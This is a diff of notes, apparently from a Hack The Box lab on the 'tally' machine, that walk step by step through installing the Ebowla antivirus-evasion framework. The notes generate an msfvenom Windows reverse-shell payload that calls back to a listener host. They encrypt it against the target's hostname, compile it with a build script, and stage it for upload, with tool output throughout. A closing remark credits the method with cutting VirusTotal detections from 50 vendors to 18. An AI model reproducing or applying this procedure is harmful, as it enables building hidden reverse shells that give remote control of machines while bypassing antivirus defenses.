@@ -1,0 +1,71 @@
+#One thing we can use is ebowla to evade anti virus. We can clone this to our /opt directory.
+#Ebowla encrypts the payload of your executable with environment variables.
+#Ebowla ensures that the paylaod executable can only be executed in the target machie keeping things in scope.
+
+==================================================================================================================================
+sudo git clone https://github.com/Genetic-Malware/Ebowla.git
+==================================================================================================================================
+
+# Since ebowla can only run using python2 we will need to install some legacy software such as pycryptodome, pyparsing, and configobj
+==================================================================================================================================
+wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+sudo python2.7 get-pip.py
+pip2.7 install configobj
+pip2.7 install pycryptodome
+pip2.7 install pyparsing
+==================================================================================================================================
+
+#Now we should be able to run ebowla but first we need to make a msfvenom payload for windows.
+==================================================================================================================================
+python2 ebowla.py 
+Usage: ebowla.py input_file_to_encode config
+==================================================================================================================================
+
+We still need to install more tools unto our system to be able to run the gcc that create windows executables
+Commands and Output:
+==================================================================================================================================
+sudo apt install binutils-mingw-w64     
+sudo apt install gcc-mingw-w64-x86-64     
+==================================================================================================================================
+
+#We now run ebowla using the newly created staged payload and specify the genetic config file.
+==================================================================================================================================
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=9004 -f exe -a x64 -o shell-9004.exe
+python2.7 /opt/Ebowla/ebowla.py shell-9004.exe /opt/Ebowla/genetic.config
+[*] Using Symmetric encryption 
+[*] Payload length 7168
+[*] Payload_type exe
+[*] Using EXE payload template
+[*] Used environment variables:
+    [-] environment value used: computername, value used: tally
+[!] Path string not used as pasrt of key    
+[!] External IP mask NOT used as part of key
+[!] System time mask NOT used as part of key
+[*] String used to source the encryption key: tally
+[*] Applying 10000 sha512 hash iterations before encryption
+[*] Encryption key: 10ec761385e793a40f42f7906556ed3b159453df06bab23256c48f3b90de4834
+[*] Writing GO payload to: go_symmetric_shell-9004.exe.go
+==================================================================================================================================
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/Ebowla]
+└──╼ $sudo ./build_x64_go.sh output/go_symmetric_shell-9004.exe.go ebowla-shell-9004.exe
+[*] Copy Files to tmp for building
+[*] Building...
+[*] Building complete
+[*] Copy ebowla-shell-9004.exe to output
+[*] Cleaning up
+[*] Done
+┌─[user@parrot-virtual]─[/opt/Ebowla/output]
+└──╼ $cp ebowla-shell-9004.exe ~/htb/tally/www/
+┌─[user@parrot-virtual]─[/opt/Ebowla/output]
+└──╼ $cd !$
+cd ~/htb/tally/www/
+┌─[user@parrot-virtual]─[~/htb/tally/www]
+└──╼ $file ebowla-shell-9004.exe 
+ebowla-shell-9004.exe: PE32+ executable (console) x86-64, for MS Windows
+==================================================================================================================================
+
+#After uploading the executable to VirusToTal we see that the ebowla exe was only picked up by 18 vendors of which run dynmaic 
+#analysis, while the normal executable by meterpreter with no AV evasion was picked by 50 vendors showcasing the power of the ebowla
+#anti-av.
+
